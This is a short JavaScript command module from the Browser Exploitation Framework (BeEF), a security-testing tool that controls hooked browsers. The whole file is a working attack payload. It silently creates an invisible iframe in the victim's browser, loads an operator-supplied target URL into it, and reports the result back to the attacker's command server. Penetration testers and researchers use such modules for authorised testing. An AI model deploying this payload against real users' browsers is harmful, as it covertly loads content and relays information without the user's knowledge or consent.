//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var target = "<%= @target %>";
	var iframe_<%= @command_id %> = beef.dom.createInvisibleIframe();
	iframe_<%= @command_id %>.setAttribute('src', target);

	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=IFrame created');

});
